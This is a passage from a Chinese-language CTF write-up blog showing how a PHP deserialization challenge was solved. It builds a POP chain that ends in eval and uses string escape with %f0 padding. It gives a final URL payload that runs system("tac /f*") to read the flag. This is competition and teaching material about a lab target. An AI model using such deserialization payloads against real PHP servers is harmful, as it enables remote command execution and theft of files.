</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>C</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>T</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$t</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>F</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>E</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$e</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>R</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Hacker</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>end</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>=</span><span class=k>new</span> <span class=nx>C</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>=</span><span class=k>new</span> <span class=nx>T</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>=</span><span class=k>new</span> <span class=nx>F</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>-&gt;</span><span class=na>f</span><span class=o>=</span><span class=k>new</span> <span class=nx>E</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>-&gt;</span><span class=na>f</span><span class=o>-&gt;</span><span class=na>e</span><span class=o>=</span><span class=k>new</span> <span class=nx>R</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>-&gt;</span><span class=na>f</span><span class=o>-&gt;</span><span class=na>e</span><span class=o>-&gt;</span><span class=na>r</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>然后写个Demo生成看看那里需要逃逸</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__file__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hacker</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$start</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>=</span><span class=nv>$start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>end</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ctfer/i&#39;</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;Hacker！&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>C</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>-&gt;</span><span class=na>c</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;C&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>T</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>t</span><span class=o>-&gt;</span><span class=na>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>F</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f</span><span class=o>-&gt;</span><span class=na>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>E</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__isset</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>e</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>R</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ez_ser.from_you&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ctf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Hacker</span><span class=p>(</span><span class=s1>&#39;{{{&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ez_ser.from_you&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;}}}&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$ctf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>传参</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?ez[ser.from_you=a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:1;N;}
</span></span></code></pre></td></tr></table></div></div><p>得到了我们本身的<code>ctf</code>的序列化payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;s:219:&#34;{{{a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:1;N;}}}}&#34;;s:3:&#34;end&#34;;N;s:8:&#34;username&#34;;s:6:&#34;hacker&#34;;}
</span></span><span class=line><span class=cl>截取有用的部分
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:1;N;}
</span></span></code></pre></td></tr></table></div></div><p>那么为了不影响我们正常反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;s:211:&#34;{{{
</span></span><span class=line><span class=cl>这些部分都是需要逃逸的
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>length</span><span class=o>=</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;s:211:&#34;{{{&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 38</span>
</span></span></code></pre></td></tr></table></div></div><p>所以是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab
</span></span></code></pre></td></tr></table></div></div><p>那么本身的序列化payload是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:1;N;}
</span></span></code></pre></td></tr></table></div></div><p>本身还要利用GC绕过抛出错误，这里直接进行修改即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:0;N;}
</span></span></code></pre></td></tr></table></div></div><p>最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&amp;ez[ser.from_you=a:2:{i:0;O:6:&#34;Hacker&#34;:3:{s:5:&#34;start&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;O:1:&#34;T&#34;:1:{s:1:&#34;t&#34;;O:1:&#34;F&#34;:1:{s:1:&#34;f&#34;;O:1:&#34;E&#34;:1:{s:1:&#34;e&#34;;O:1:&#34;R&#34;:1:{s:1:&#34;r&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}}s:3:&#34;end&#34;;s:6:&#34;hacker&#34;;s:8:&#34;username&#34;;R:9;}i:0;N;}
</span></span></code></pre></td></tr></table></div></div><h1 id=0x03-小结>0x03 小结</h1><p>打不动了，而且后面的我挺多知识点涉及的，我害的练啊</p></section><footer class=article-footer><section class=article-tags><a href=/tags/flask/>Flask</a>
<a href=/tags/php/>Php</a>
<a href=/tags/jwt/>Jwt</a>
<a href=/tags/mysql/>Mysql</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/shctf2024/><div class=article-details><h2 class=article-title>SHCTF2024</h2></div></a></article><article><a href=/p/suctf2025/><div class=article-details><h2 class=article-title>SUCTF2025</h2></div></a></article><article><a href=/p/iron-three-2024/><div class=article-details><h2 class=article-title>铁三2024</h2></div></a></article><article><a href=/p/geek-challenge-2024/><div class=article-details><h2 class=article-title>极客大挑战2024</h2></div></a></article><article><a href=/p/shudaoshan-2024/><div class=article-details><h2 class=article-title>蜀道山2024</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>